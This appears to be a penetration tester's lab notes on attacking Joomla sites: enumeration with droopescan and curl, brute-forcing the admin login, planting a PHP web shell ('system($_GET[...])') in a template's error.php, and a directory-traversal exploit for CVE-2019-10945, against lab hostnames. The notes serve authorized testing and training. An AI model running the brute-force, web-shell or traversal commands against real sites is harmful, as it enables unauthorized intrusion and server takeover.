### Footprinting + Enumeration
[droopescan](https://github.com/droope/droopescan) and [JoomlaScan](https://github.com/drego85/JoomlaScan) 
```bash
droopescan scan joomla --url http://blog.trilocor.local/
python2.7 joomlascan.py -u http://blog.trilocor.local
```
Is this Joomla?
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
curl -s http://blog.trilocor.local/robots.txt
curl -s http://blog.trilocor.local/README.txt | head -n 5
```
Less common
```bash
curl -s http://blog.trilocor.localadministrator/manifests/files/joomla.xml | xmllint --format -
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```
### Exploitation
##### Login bruteforcing
The default administrator account on Joomla installs is `admin`, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use [Joomla-brute](https://github.com/ajnik/joomla-bruteforce) for this.
```bash
python3 joomla-brute.py -u  http://blog.trilocor.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
##### RCE
> [!NOTE] Note
> If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

Visit `/administrator` -> `Templates` -> `Configuration`

Choose an unused template and add PHP one liner to an uncommon page (`error.php`)
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
**ITS BEST PRACTICE TO USE NON-GUESSABLE PARAMETERS FOR OUR RCE PAYLOADS TO AVOID ANY DRIVEBY ATTACKERS. we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.**
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

##### Known Vulnerabilities
Version `3.9.4` is vulnerable to [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) in which an exploit can be found [here](https://github.com/dpgg101/CVE-2019-10945) 
This would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds
```bash
python3 joomla_dir_trav.py --url "http://blog.trilocor.local/administrator/" --username admin --password admin --dir /
```